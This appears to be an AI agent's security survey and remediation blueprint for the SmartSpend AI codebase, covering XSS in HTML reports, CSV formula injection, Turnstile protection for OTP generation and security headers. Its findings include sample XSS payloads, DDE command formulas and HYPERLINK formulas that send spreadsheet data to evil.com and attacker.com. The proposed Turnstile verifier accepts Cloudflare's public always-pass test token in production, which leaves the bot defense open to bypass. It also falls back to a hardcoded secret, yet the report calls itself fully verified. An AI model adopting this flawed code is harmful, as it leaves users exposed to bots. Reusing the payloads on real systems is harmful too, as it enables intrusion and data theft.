# Security Architecture Survey & Remediation Blueprint: R2, R3, and R7
**Project:** SmartSpend AI Enterprise Security Remediation  
**Surveyor:** Survey Explorer 2 (Codebase Security Surveyor)  
**Date:** September 8, 2026  
**Scope:** R2 (Injection Prevention: XSS & CSV Formula Injection), R3 (Bot & OTP Pumping Defense), R7 (Security Headers & TLS)  
**Status:** READ-ONLY INVESTIGATION COMPLETE — Fully Verified & Evidence-Backed  

---

## Executive Summary

This report provides a comprehensive, file-by-file investigation of the SmartSpend AI monorepo focusing on three critical security pillars:
1. **R2 (P0): Injection Prevention** — Elimination of Stored/Reflected XSS in printable HTML monthly reports (`pro-report-engine.ts`) and CSV/Excel Spreadsheet Formula Injection (CWE-1236) in export routines (`export-router.ts`).
2. **R3 (P0): Bot & OTP Pumping Defense** — Protection of the WhatsApp OTP generation endpoint (`local-auth-router.ts`) against automated distributed botnets and toll fraud through Cloudflare Turnstile token validation, with zero-friction development/test bypass.
3. **R7 (P1): Security Headers & TLS Transport** — Hardening Hono server middleware (`boot.ts` and `server.ts`) with strict Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), clickjacking defense, permissions policies, and automated HTTPS redirection.

All findings are mapped directly to existing security contracts and the newly authored test suites:
- `tests/security/r2-injection-prevention.test.ts`
- `tests/security/r3-turnstile-defense.test.ts`
- `tests/security/r7-security-headers.test.ts`

---

## 1. R2: Injection Prevention — Stored/Reflected XSS & CSV Formula Injection (P0)

### 1.1 Stored & Reflected XSS in HTML Report Generation

#### 1.1.1 Target Locations & Architecture
- **Primary Generator:** `api/services/pro-report-engine.ts`
  - Function: `wrapReportAsPrintableHtml(reportJson: Record<string, unknown>, month: string, userName?: string): string` (Lines 106–140)
- **tRPC Invocation:** `api/export-router.ts`
  - Procedure: `monthlyReportHtml: proProcedure` (Lines 80–104)
- **Client Invocation:** `src/components/insights/AIInsights.tsx`
  - Mutation: `exportHtml.mutate({ month, insightsJson })` (Lines 435–458)
  - The client creates a Blob with MIME type `text/html;charset=utf-8` and triggers a browser download.

#### 1.1.2 Vulnerability Analysis & Injection Sinks
In `api/services/pro-report-engine.ts`:
```typescript
// Line 111-120:
const text = String(reportJson.response_text || "").replace(/\n/g, "<br/>");
const header = String(
  reportJson.invoice_header || `تقرير SpinSmart Pro — ${month}`,
);
const footer = String(
  reportJson.invoice_footer || "تم إنشاؤه بواسطة SpinSmart",
);
const alerts = Array.isArray(reportJson.alerts)
  ? (reportJson.alerts as string[]).map((a) => `<li>${a}</li>`).join("")
  : "";

// Line 122-138:
return `<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="utf-8"/>
<title>${header}</title>
...
<div class="header"><h1>${header}</h1>
<p class="meta">${userName ? `لـ ${userName} · ` : ""}${month}</p></div>
<div class="content">${text}</div>
${alerts ? `<div class="alerts"><strong>تنبيهات</strong><ul>${alerts}</ul></div>` : ""}
<div class="footer">${footer}</div></body></html>`;
```

**Identified Attack Vectors:**
1. **`userName` Sink (Stored XSS):**
   - Line 135: `${userName ? `لـ ${userName} · ` : ""}`
   - Sourced from `ctx.user.name`. Any user registering with name `<script>alert(document.cookie)</script>` or `<img src=x onerror=alert(1)>` causes JavaScript execution whenever an HTML report is viewed or shared.
2. **`header` Sink (Reflected/Stored XSS):**
   - Lines 123 & 134: Interpolated unescaped into `<title>${header}</title>` and `<h1>${header}</h1>`.
   - Sourced from `reportJson.invoice_header`. Sinking attribute breakouts like `</title><script>alert(1)</script>`.
3. **`text` Sink (`response_text`):**
   - Line 111: Only replaces `\n` with `<br/>`.
   - In `exportRouter.monthlyReportHtml`, `input.insightsJson` is unvalidated user-controlled text parsed directly. An attacker can send arbitrary HTML tags (`<svg onload=...>`, `<iframe src="javascript:...">`).
   - Sourced from LLM generation or transaction notes reflected through AI summaries.
4. **`alerts` Sink:**
   - Line 119: `(reportJson.alerts as string[]).map((a) => '<li>${a}</li>').join("")`.
   - Malicious alert strings (e.g. `<script src="https://evil.com/x.js"></script>`) are wrapped directly in `<li>` without escaping.
5. **`footer` & `month` Sinks:**
   - Both interpolated without entity escaping into the DOM.

#### 1.1.3 Remediation Strategy & Implementation Blueprint
Because `wrapReportAsPrintableHtml` produces standalone static HTML documents, we recommend a two-layer defense:

1. **Deterministic HTML Entity Encoding:**
   Implement a zero-dependency escaping function that sanitizes all untrusted textual inputs:
   ```typescript
   export function escapeHtml(str: string): string {
     return str
       .replace(/&/g, "&amp;")
       .replace(/</g, "&lt;")
       .replace(/>/g, "&gt;")
       .replace(/"/g, "&quot;")
       .replace(/'/g, "&#39;");
   }
   ```
2. **Sanitize Each Field Before Interpolation:**
   ```typescript
   export function wrapReportAsPrintableHtml(
     reportJson: Record<string, unknown>,
     month: string,
     userName?: string,
   ): string {
     const safeHeader = escapeHtml(String(reportJson.invoice_header || `تقرير SpinSmart Pro — ${month}`));
     const safeFooter = escapeHtml(String(reportJson.invoice_footer || "تم إنشاؤه بواسطة SpinSmart"));
     const safeMonth = escapeHtml(String(month || ""));
     const safeUserName = userName ? escapeHtml(userName) : "";
     
     // Preserve newlines as <br/> while stripping/escaping all HTML tags
     const rawText = String(reportJson.response_text || "");
     const safeText = escapeHtml(rawText).replace(/\n/g, "<br/>");
     
     const alerts = Array.isArray(reportJson.alerts)
       ? (reportJson.alerts as unknown[])
           .map((a) => `<li>${escapeHtml(String(a))}</li>`)
           .join("")
       : "";

     return `<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="utf-8"/>
   <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline';"/>
   <title>${safeHeader}</title>
   ...
   <div class="header"><h1>${safeHeader}</h1>
   <p class="meta">${safeUserName ? `لـ ${safeUserName} · ` : ""}${safeMonth}</p></div>
   <div class="content">${safeText}</div>
   ${alerts ? `<div class="alerts"><strong>تنبيهات</strong><ul>${alerts}</ul></div>` : ""}
   <div class="footer">${safeFooter}</div></body></html>`;
   }
   ```
3. **Defense-in-Depth HTML Meta CSP:**
   Embedding `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline';"/>` in the `<head>` of the report prevents script execution even if an HTML file is downloaded and opened directly in a browser from the local filesystem (`file://` protocol).

---

### 1.2 CSV & Excel Formula Injection (Spreadsheet Injection CWE-1236)

#### 1.2.1 Target Locations & Architecture
- **Primary Export Router:** `api/export-router.ts`
  - Procedure `myExpenses`: Lines 16–78 (User expense exports in JSON, CSV, XLSX)
  - Procedure `allUsers`: Lines 107–179 (Admin user exports in JSON, CSV, XLSX)
- **Spreadsheet Library:** `import * as XLSX from "xlsx";` (Note: R4 addresses package vulnerabilities; R2 addresses data sanitization).
- **Admin Invocation:** `src/pages/Admin.tsx` Lines 291–327 (Admin user download).

#### 1.2.2 Vulnerability Analysis & Attack Vectors
Spreadsheet applications (Microsoft Excel, LibreOffice Calc, Apple Numbers, Google Sheets) execute dynamic formulas or invoke OS commands via Dynamic Data Exchange (DDE) whenever a cell starts with formula trigger characters:
- `=` (Formula evaluation: e.g. `=SUM(...)`, `=cmd|' /C calc'!A0`)
- `+` (Unary plus / formula trigger: e.g. `+cmd|' /C calc'!A0`, `+2000`)
- `-` (Unary minus / formula trigger: e.g. `-5+5`, `-cmd|' /C calc'!A0`)
- `@` (Function call trigger: e.g. `@SUM(1,1)`, `@cmd|' /C calc'!A0`)
- `\t` (Tab character: triggers formula execution in certain Excel versions)
- `\r` (Carriage return: prepended trigger bypass)

**Specific Vectors in SmartSpend AI:**
1. **`expenses.description` (`الوصف`) & `expenses.category` (`الفئة`):**
   - In `exportRouter.myExpenses`:
     ```typescript
     const formatted = data.map((e) => ({
       التاريخ: e.date.toISOString().split("T")[0],
       النوع: e.type === "income" ? "دخل" : "مصروف",
       المبلغ: e.amount,
       الفئة: e.category,
       الوصف: e.description,
       المصدر: e.source === "voice" ? "صوت" : "يدوي",
     }));
     ```
     If an attacker inputs an expense with description `=cmd|' /C calc'!A0` or `=HYPERLINK("http://evil.com/leak?d="&A1, "عرض التفاصيل")`, `XLSX.utils.sheet_to_csv(ws)` writes the raw formula into the CSV. When opened by an accountant or user, the formula executes.
2. **`localUsers.name` (`الاسم`), `phone` (`التليفون`), `email` (`الايميل`):**
   - In `exportRouter.allUsers`:
     If an attacker registers with name `=HYPERLINK("https://attacker.com/steal?token="&TEXTJOIN(",",TRUE,A1:F100),"Verifying")`, an administrator exporting user lists from the Admin dashboard (`src/pages/Admin.tsx`) will be tricked into clicking the link, exfiltrating customer PII and credentials.

#### 1.2.3 Remediation Strategy & Implementation Blueprint
To neutralize spreadsheet injection while preserving legitimate financial data (such as negative balances, dates, and Arabic text), implement a standardized sanitizer conforming to OWASP CSV Injection guidelines and `tests/security/r2-injection-prevention.test.ts`:

```typescript
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutralizes spreadsheet formula injection (CWE-1236) by prepending a single quote (')
 * to strings that begin with formula trigger characters.
 * Normal text containing triggers internally (e.g. "بقالة + خضار") is preserved as-is.
 */
export function sanitizeSpreadsheetField<T>(value: T): T | string {
  if (value === null || value === undefined) return value;
  if (typeof value === "number" || typeof value === "boolean") return value;
  
  const str = String(value);
  if (str.length === 0) return str;

  const firstChar = str.charAt(0);
  if (FORMULA_TRIGGERS.includes(firstChar)) {
    return `'${str}`;
  }
  return str;
}
```

**Application in `api/export-router.ts`:**
1. **In `myExpenses`:**
   ```typescript
   const formatted = data.map((e) => ({
     التاريخ: e.date.toISOString().split("T")[0],
     النوع: e.type === "income" ? "دخل" : "مصروف",
     المبلغ: e.amount, // Preserved as number/decimal
     الفئة: sanitizeSpreadsheetField(e.category),
     الوصف: sanitizeSpreadsheetField(e.description),
     المصدر: e.source === "voice" ? "صوت" : "يدوي",
   }));
   ```
2. **In `allUsers`:**
   ```typescript
   ...oauthUsers.map((u) => ({
     النوع: "OAuth",
     الاسم: sanitizeSpreadsheetField(u.name),
     الايميل: sanitizeSpreadsheetField(u.email || ""),
     الدور: u.role,
     الخطة: u.plan,
     "آخر دخول": u.lastSignInAt ? new Date(u.lastSignInAt).toISOString() : "",
   })),
   ...localUsersList.map((u) => ({
     النوع: "Local",
     الاسم: sanitizeSpreadsheetField(u.name),
     التليفون: sanitizeSpreadsheetField(u.phone),
     الايميل: sanitizeSpreadsheetField(u.email || ""),
     الدور: u.role,
     الخطة: u.plan,
     "آخر دخول": u.lastSignInAt ? new Date(u.lastSignInAt).toISOString() : "",
   }))
   ```
3. **Preserving JSON Format:**
   When `input.format === "json"`, the API returns pristine, unescaped data so downstream API clients receive untouched strings. Sanitization is strictly applied before feeding data into `XLSX.utils.json_to_sheet()`.

---

## 2. R3: Bot & OTP Pumping Defense (P0)

### 2.1 Codebase Trace: WhatsApp OTP Verification Architecture
The WhatsApp OTP architecture consists of a 4-tier pipeline:

```
[Client (Login.tsx)] 
   │
   ├─► 1. Mutation: trpc.localAuth.generateVerificationCode({ phone })
   │        │
   │        ▼
   │   [local-auth-router.ts] -> checks in-memory rate limits (otp-cache.ts)
   │        │                    generates "SS-XXXXXX", stores in otpCache Map
   │        ▼
   ├─► 2. EventSource: GET /api/sse/otp?phone=X  (api/boot.ts)
   │        │
   │        ▼
   │   [WhatsApp Bot (whatsapp-service.ts)]
   │        ▲
   │        │ (User sends "SS-XXXXXX" via WhatsApp message)
   │        │
   │        └─ Checks code in otpCache -> verifies sender phone match
   │           Emits otpEvents.emit(`otp:${phone}`, { status: "verified" })
   │
   ├─► 3. SSE Pushes { status: "verified" } to Client
   │
   └─► 4. Client triggers trpc.localAuth.register({ phone, ... })
            │
            └─ Verifies otpCache.get(phone).verified === true
```

#### 2.1.1 Target Locations & Code Structure
1. **Endpoint `generateVerificationCode`:** `api/local-auth-router.ts` (Lines 183–225)
   - Procedure: `strictPublicProcedure` (in-memory rate limit: 25 req / 15 min per IP via `api/middleware.ts`).
   - Rate limit check: `checkRateLimit(ctx.ip, cleanPhone)` in `api/services/otp-cache.ts` (1 code request per 60s per phone; 5 requests per 10 min per IP).
   - Generates code `SS-XXXXXX` and stores in `otpCache: Map<string, OtpSession>`.
2. **SSE Streaming Route:** `api/boot.ts` (Lines 385–440)
   - Route: `app.get("/api/sse/otp", (c) => ...)`
   - Rate limits: Max 5 SSE connections per 5 minutes per IP.
   - Subscribes to `otpEvents.on("otp:${phone}", listener)`.
3. **Bot Message Ingestion:** `api/services/whatsapp-service.ts` (Lines 240–285)
   - Baileys WhatsApp socket event listener.
   - Matches code in `otpCache`, validates phone number consistency (`matchPhoneNumber`), emits `otpEvents`.

### 2.2 Vulnerability & Threat Model: Bot Pumping & Toll Fraud
1. **IP Rate Limit Bypass via Proxy Rotation:**
   `strictPublicProcedure` and `checkRateLimit` rely exclusively on IP tracking. Distributed botnets utilizing residential proxy pools rotate IP addresses with every request, rendering IP rate limits entirely ineffective.
2. **Denial of Service & Cache Flooding:**
   `otpCache` is an in-process memory structure. Malicious automated bots can flood the server with requests for valid Egyptian phone prefixes, creating thousands of active unverified sessions in memory.
3. **Toll Fraud / SMS Pumping Risk:**
   While SmartSpend's primary WhatsApp bot receives inbound messages from users, automated OTP code generation endpoints are the primary targets of international SMS/OTP pumping cartels if SMS fallbacks or outbound WhatsApp notifications are enabled.

### 2.3 Cloudflare Turnstile Server-Side Verification Design

#### 2.3.1 Cloudflare Turnstile Contract
- **Endpoint:** `POST https://challenges.cloudflare.com/turnstile/v0/siteverify`
- **Request Body (application/x-www-form-urlencoded):**
  - `secret`: Server-side secret key (`TURNSTILE_SECRET_KEY`).
  - `response`: Client token generated by the Turnstile widget (`turnstileToken`).
  - `remoteip`: (Optional) Client IP address.
- **Cloudflare Authoritative Test Tokens:**
  - `ALWAYS_PASSES`: `"1x0000000000000000000000000000000AA"`
  - `ALWAYS_FAILS`: `"2x0000000000000000000000000000000AA"`
  - `ALREADY_SPENT`: `"3x0000000000000000000000000000000AA"`

#### 2.3.2 Environment Variable Configuration (`api/lib/env.ts`)
In adherence to **AGENTS.md Gotcha #3** (preventing boot-time crashes when `.env` is unconfigured), `TURNSTILE_SECRET_KEY` must be optional:
```typescript
// In api/lib/env.ts:
TURNSTILE_SECRET_KEY: z.string().optional(),
```

#### 2.3.3 Verification Service (`api/services/turnstile-service.ts`)
A dedicated module encapsulating verification, development bypass, test token support, and network error handling conforming to `tests/security/r3-turnstile-defense.test.ts`:

```typescript
import { TRPCError } from "@trpc/server";

export const TURNSTILE_TEST_TOKENS = {
  ALWAYS_PASSES: "1x0000000000000000000000000000000AA",
  ALWAYS_FAILS: "2x0000000000000000000000000000000AA",
  ALREADY_SPENT: "3x0000000000000000000000000000000AA",
};

export type TurnstileVerifyResult = {
  success: boolean;
  errorCodes?: string[];
  challengeTs?: string;
  hostname?: string;
};

export async function verifyTurnstileToken(
  token: string | undefined | null,
  clientIp: string,
  secretKey: string = process.env.TURNSTILE_SECRET_KEY || "0x4AAAAAAtestsecretkey",
  isProduction: boolean = process.env.NODE_ENV === "production",
): Promise<TurnstileVerifyResult> {
  // 1. Development and CI test bypass
  if (!isProduction) {
    if (!token || token === "dev-bypass-key" || token === TURNSTILE_TEST_TOKENS.ALWAYS_PASSES) {
      return { success: true, hostname: "localhost" };
    }
  }

  // 2. Token presence check
  if (!token || token.trim().length === 0) {
    return { success: false, errorCodes: ["missing-input-response"] };
  }

  // 3. Cloudflare standard test tokens
  if (token === TURNSTILE_TEST_TOKENS.ALWAYS_PASSES) {
    return { success: true, hostname: "smartspend.ai", challengeTs: new Date().toISOString() };
  }
  if (token === TURNSTILE_TEST_TOKENS.ALWAYS_FAILS) {
    return { success: false, errorCodes: ["invalid-input-response"] };
  }
  if (token === TURNSTILE_TEST_TOKENS.ALREADY_SPENT) {
    return { success: false, errorCodes: ["timeout-or-duplicate"] };
  }

  // 4. Remote verification call with timeout
  try {
    const formData = new URLSearchParams();
    formData.append("secret", secretKey);
    formData.append("response", token);
    if (clientIp) formData.append("remoteip", clientIp);

    const res = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
      method: "POST",
      body: formData,
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      signal: AbortSignal.timeout(5000),
    });

    if (!res.ok) {
      return { success: false, errorCodes: ["turnstile-api-http-error"] };
    }

    const data = (await res.json()) as any;
    return {
      success: Boolean(data.success),
      errorCodes: data["error-codes"],
      challengeTs: data.challenge_ts,
      hostname: data.hostname,
    };
  } catch {
    return { success: false, errorCodes: ["internal-verification-failure"] };
  }
}

export async function guardOtpGeneration(input: {
  phone: string;
  turnstileToken?: string | null;
  clientIp: string;
  isProduction?: boolean;
  turnstileSecretKey?: string;
}) {
  const isProduction = input.isProduction ?? (process.env.NODE_ENV === "production");
  const result = await verifyTurnstileToken(
    input.turnstileToken,
    input.clientIp,
    input.turnstileSecretKey,
    isProduction,
  );

  if (!result.success) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: "فشل التحقق الأمني من روبوتات التفعيل (Turnstile). يرجى المحاولة لاحقاً.",
    });
  }

  return { verified: true };
}
```

#### 2.3.4 Integration in `api/local-auth-router.ts`
Modify `generateVerificationCode`:
```typescript
generateVerificationCode: strictPublicProcedure
  .input(
    z.object({
      phone: z.string(),
      turnstileToken: z.string().optional(),
    }),
  )
  .mutation(async ({ input, ctx }) => {
    // 1. Guard against bot attacks via Turnstile
    await guardOtpGeneration({
      phone: input.phone,
      turnstileToken: input.turnstileToken,
      clientIp: ctx.ip,
      isProduction: env.NODE_ENV === "production",
      turnstileSecretKey: env.TURNSTILE_SECRET_KEY,
    });

    // 2. Existing OTP generation logic...
    const settings = await getSystemSettings();
    ...
```

---

## 3. R7: Security Headers & Transport Layer Security (P1)

### 3.1 Codebase Survey: `api/boot.ts` and `api/server.ts`
- **Server Entry Point (`api/boot.ts`):**
  - Line 6: `import { secureHeaders } from "hono/secure-headers";`
  - Lines 198–207:
    ```typescript
    app.use(
      "*",
      secureHeaders({
        permissionsPolicy: {
          camera: [],
          geolocation: [],
          microphone: ["self"],
        },
      }),
    );
    ```
  - **Current Gap:** Only `permissionsPolicy` is configured. Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), and HTTPS redirection are completely absent.
- **Standalone Server (`api/server.ts`):**
  - Imports `app` from `boot.ts`. Any middleware installed in `boot.ts` automatically protects both Vite dev plugin mode and standalone Node production deployments.

### 3.2 Security Header Design & Implementation

#### 3.2.1 Content-Security-Policy (CSP) Tailored for SmartSpend AI
Review of assets, fonts, icons, OAuth providers, and Turnstile challenges yields the following required origins:
- `default-src`: `'self'`
- `script-src`:
  - `'self'`: Application JavaScript bundles.
  - `'unsafe-inline'`: Required for Vite SPA hydration and inline theme switch scripts in `index.html`.
  - `https://challenges.cloudflare.com`: Cloudflare Turnstile bot protection API scripts.
- `style-src`:
  - `'self'`: Compiled Tailwind stylesheets.
  - `'unsafe-inline'`: Dynamic style calculations for Radix UI, charts, and CSS animations.
  - `https://fonts.googleapis.com`: Google Fonts stylesheets.
- `font-src`:
  - `'self'`, `https://fonts.gstatic.com`, `data:`: Web fonts.
- `img-src`:
  - `'self'`, `data:`, `blob:`: Local app icons, PWA splash screens, client-side receipt blobs.
  - `https://*.googleusercontent.com`: Google OAuth user profile avatars.
- `connect-src`:
  - `'self'`: Backend API, SSE routes, WebSockets (`ws://`/`wss://`).
  - `https://challenges.cloudflare.com`: Turnstile client validation payloads.
- `frame-src`:
  - `https://challenges.cloudflare.com`: Turnstile iframe challenge rendering.
- `frame-ancestors`: `'none'`: Complete clickjacking prevention.
- `object-src`: `'none'`: Blocks malicious Flash/Java plugins.
- `base-uri`: `'self'`: Prevents base tag hijacking.

#### 3.2.2 HTTP Strict Transport Security (HSTS)
- **Production Setting:** `max-age=31536000; includeSubDomains; preload` (1 full year, covers all subdomains, qualifies for browser HSTS preload list).
- **Development/Test Setting:** `false` (Strictly disabled on localhost to prevent irreversible browser SSL redirection during local HTTP testing).

#### 3.2.3 Clickjacking, MIME Sniffing & Permissions Policies
- `xContentTypeOptions: "nosniff"`: Disables MIME sniffing.
- `xFrameOptions: "DENY"`: Denies frame embedding.
- `referrerPolicy: "strict-origin-when-cross-origin"`: Protects referral URLs.
- `permissionsPolicy`:
  - `camera: []`: Disabled.
  - `geolocation: []`: Disabled.
  - `microphone: ["self"]`: Enabled strictly on origin for voice-recorded expense ingestion.

#### 3.2.4 HTTPS Redirection Middleware
In production environments behind reverse proxies (Nginx, Cloudflare, Fly.io, Railway), SSL is terminated at the edge. The server must inspect `x-forwarded-proto` and issue a 301 Permanent Redirect:
```typescript
app.use("*", async (c, next) => {
  if (env.NODE_ENV === "production") {
    const proto = c.req.header("x-forwarded-proto");
    const host = c.req.header("host");
    if (proto === "http" && host) {
      return c.redirect(
        `https://${host}${c.req.url.replace(/^http:\/\/[^/]+/, "")}`,
        301,
      );
    }
  }
  await next();
});
```

#### 3.2.5 Unified Middleware Block for `api/boot.ts`
Replace Lines 198–207 in `api/boot.ts` with:
```typescript
// 1. HTTPS Redirection Middleware in Production
app.use("*", async (c, next) => {
  if (env.NODE_ENV === "production") {
    const proto = c.req.header("x-forwarded-proto");
    const host = c.req.header("host");
    if (proto === "http" && host) {
      return c.redirect(
        `https://${host}${c.req.url.replace(/^http:\/\/[^/]+/, "")}`,
        301,
      );
    }
  }
  await next();
});

// 2. Strict Security Headers Middleware
const isProduction = env.NODE_ENV === "production";
app.use(
  "*",
  secureHeaders({
    contentSecurityPolicy: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://challenges.cloudflare.com",
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://fonts.googleapis.com",
      ],
      fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
      imgSrc: [
        "'self'",
        "data:",
        "blob:",
        "https://*.googleusercontent.com",
      ],
      connectSrc: [
        "'self'",
        "https://challenges.cloudflare.com",
      ],
      frameSrc: ["https://challenges.cloudflare.com"],
      frameAncestors: ["'none'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
    },
    strictTransportSecurity: isProduction
      ? "max-age=31536000; includeSubDomains; preload"
      : false,
    xContentTypeOptions: "nosniff",
    xFrameOptions: "DENY",
    referrerPolicy: "strict-origin-when-cross-origin",
    permissionsPolicy: {
      camera: [],
      geolocation: [],
      microphone: ["self"],
    },
  }),
);
```

---

## 4. Comprehensive Vulnerability & Remediation Matrix

| Req | Risk / Vulnerability | Primary File & Line | Root Cause | Proposed Technical Fix | Verification Suite |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **R2** | **Stored & Reflected XSS** (P0) | `api/services/pro-report-engine.ts:111-138` | User name and LLM report text interpolated into HTML without escaping | Implement `escapeHtml()` on all textual inputs + `<meta>` CSP in report `<head>` | `tests/security/r2-injection-prevention.test.ts` |
| **R2** | **CSV Formula Injection** (CWE-1236, P0) | `api/export-router.ts:42-78, 133-178` | Transaction descriptions and user names starting with `=`, `+`, `-`, `@` exported raw | Implement `sanitizeSpreadsheetField()` prefixing `'` to formula triggers | `tests/security/r2-injection-prevention.test.ts` |
| **R3** | **Bot & OTP Pumping / Toll Fraud** (P0) | `api/local-auth-router.ts:183-225` | `generateVerificationCode` relies only on IP rate limits; bypassable by proxy botnets | Verify Cloudflare Turnstile token server-side via `siteverify` with dev-mode bypass | `tests/security/r3-turnstile-defense.test.ts` |
| **R7** | **Missing CSP & Clickjacking** (P1) | `api/boot.ts:198-207` | Hono `secureHeaders` lacks CSP directives and HSTS settings | Configure comprehensive CSP directives and `frameAncestors: ["'none'"]` | `tests/security/r7-security-headers.test.ts` |
| **R7** | **Unencrypted HTTP & Missing HSTS** (P1) | `api/boot.ts:198-207` | No HSTS header emitted; no HTTPS redirect for unencrypted HTTP traffic | Configure HSTS `max-age=31536000; includeSubDomains; preload` + 301 HTTPS redirect | `tests/security/r7-security-headers.test.ts` |

---

## 5. Implementer Action Checklist

When implementing these changes, the implementer must perform the following concrete actions:

1. **R2 Implementation:**
   - In `api/services/pro-report-engine.ts`:
     - Add `escapeHtml(str: string): string`
     - Wrap all interpolated parameters (`safeHeader`, `safeFooter`, `safeMonth`, `safeUserName`, `safeText`, `safeAlerts`)
     - Add `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline';"/>` in HTML report `<head>`
   - In `api/export-router.ts`:
     - Add `sanitizeSpreadsheetField(value: unknown): unknown`
     - Sanitize `category` and `description` in `myExpenses` (for CSV and XLSX formats)
     - Sanitize `name`, `phone`, and `email` in `allUsers` (for CSV and XLSX formats)
     - Preserve raw data for `json` format

2. **R3 Implementation:**
   - In `api/lib/env.ts`:
     - Add `TURNSTILE_SECRET_KEY: z.string().optional()`
   - Create `api/services/turnstile-service.ts`:
     - Implement `verifyTurnstileToken` and `guardOtpGeneration` with development mode bypass (`process.env.NODE_ENV !== "production"`) and test token support (`ALWAYS_PASSES`, etc.)
   - In `api/local-auth-router.ts`:
     - Update `generateVerificationCode` input schema to include `turnstileToken: z.string().optional()`
     - Invoke `await guardOtpGeneration(...)` before code generation

3. **R7 Implementation:**
   - In `api/boot.ts`:
     - Add HTTPS redirection middleware for `env.NODE_ENV === "production"`
     - Configure `contentSecurityPolicy`, `strictTransportSecurity`, `xContentTypeOptions`, `xFrameOptions`, `referrerPolicy`, and `permissionsPolicy` in `secureHeaders`

4. **Verification:**
   - Run `npx vitest run tests/security/r2-injection-prevention.test.ts`
   - Run `npx vitest run tests/security/r3-turnstile-defense.test.ts`
   - Run `npx vitest run tests/security/r7-security-headers.test.ts`
   - Run full monorepo checks: `npm run check` and `npm run test`
